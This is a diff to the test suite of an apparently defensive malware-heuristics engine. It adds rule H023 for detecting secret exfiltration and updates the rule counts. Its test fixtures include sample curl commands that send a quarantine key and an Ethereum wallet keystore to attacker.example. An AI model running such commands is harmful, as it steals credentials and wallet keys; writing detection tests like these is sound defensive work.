@@ -34,7 +34,7 @@ from ekprotection.heuristics.rules      import (
     _r_sensitive_files, _r_rm_rf, _r_fork_bomb, _r_history_deletion,
     _r_obfuscation, _r_ptrace_ld_preload, _r_memfd_proc, _r_packed_upx,
     _r_hardcoded_ip, _r_crypto_strings, _r_c2_beacon, _r_chmod_plus_x,
-    _r_hidden_executable, _r_no_extension_elf,
+    _r_hidden_executable, _r_no_extension_elf, _r_secret_exfiltration,
 )
 from ekprotection.heuristics.engine     import HeuristicEngine, HeuristicResult
 
@@ -120,7 +120,7 @@ class TestAllRulesCatalog:
             assert rule.rule_id in RULES_BY_ID
 
     def test_total_rule_count(self) -> None:
-        assert len(ALL_RULES) == 22
+        assert len(ALL_RULES) == 23
 
 
 # ---------------------------------------------------------------------------
@@ -466,6 +466,40 @@ class TestRuleH022ElfNoExtension:
         assert _r_no_extension_elf(ctx, "H022") is None
 
 
+class TestRuleH023SecretExfiltration:
+    """Achado real da rodada de 2026-09-15: nenhuma regra existente cobria
+    o padrão "ler segredo próprio do EK-Protection ou de wallet + mandar
+    pra rede" — H009 só olha /etc/shadow&cia (credenciais do SO, não da
+    wallet/app), H019 exige loop de beacon (sleep+curl), não upload
+    único."""
+
+    def test_quarantine_key_plus_curl_upload_triggers(self) -> None:
+        ctx = _ctx(
+            content=b"curl -F 'f=@/home/user/.config/ekprotection/quarantine.key' "
+                     b"http://attacker.example/exfil"
+        )
+        assert _r_secret_exfiltration(ctx, "H023") is not None
+
+    def test_wallet_keystore_plus_data_upload_triggers(self) -> None:
+        ctx = _ctx(
+            content=b"cat /root/.ethereum/keystore/UTC--2020 | "
+                     b"curl -d @- http://attacker.example/exfil"
+        )
+        assert _r_secret_exfiltration(ctx, "H023") is not None
+
+    def test_secret_path_without_network_no_trigger(self) -> None:
+        ctx = _ctx(content=b"cp wallet.dat /home/user/backup/wallet.dat")
+        assert _r_secret_exfiltration(ctx, "H023") is None
+
+    def test_curl_upload_without_secret_path_no_trigger(self) -> None:
+        ctx = _ctx(content=b"curl -F 'f=@/tmp/report.txt' http://internal/upload")
+        assert _r_secret_exfiltration(ctx, "H023") is None
+
+    def test_plain_download_no_trigger(self) -> None:
+        ctx = _ctx(content=b"curl http://example.com/wallet.dat -o wallet.dat")
+        assert _r_secret_exfiltration(ctx, "H023") is None
+
+
 # ---------------------------------------------------------------------------
 # Testes: HeuristicEngine
 # ---------------------------------------------------------------------------
@@ -593,8 +627,8 @@ class TestHeuristicEngine:
     def test_status(self, engine: HeuristicEngine) -> None:
         s = engine.status()
         assert s["enabled"]      is True
-        assert s["rules_total"]  == 22
-        assert s["rules_active"] == 22
+        assert s["rules_total"]  == 23
+        assert s["rules_active"] == 23
         assert s["sensitivity"]  == "medium"
 
     def test_log_manager_called_on_suspicious(self, cfg: ConfigManager, tmp_path: Path) -> None:
